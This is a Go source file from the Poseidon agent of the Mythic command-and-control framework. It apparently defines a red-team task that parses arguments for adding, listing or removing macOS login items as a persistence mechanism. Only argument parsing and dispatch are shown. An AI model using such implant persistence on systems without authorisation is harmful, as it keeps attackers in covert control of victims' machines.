package persist_loginitem

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Path   string
	Name   string
	Global bool
	List   bool
	Remove bool
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["path"]; ok {
		e.Path = v.(string)
	}
	if v, ok := alias["name"]; ok {
		e.Name = v.(string)
	}
	if v, ok := alias["global"]; ok {
		e.Global = v.(bool)
	}
	if v, ok := alias["list"]; ok {
		e.List = v.(bool)
	}
	if v, ok := alias["remove"]; ok {
		e.Remove = v.(bool)
	}
	return nil
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	r := runCommand(args.Path, args.Name, args.Global, args.List, args.Remove)
	msg.UserOutput = r.Message
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
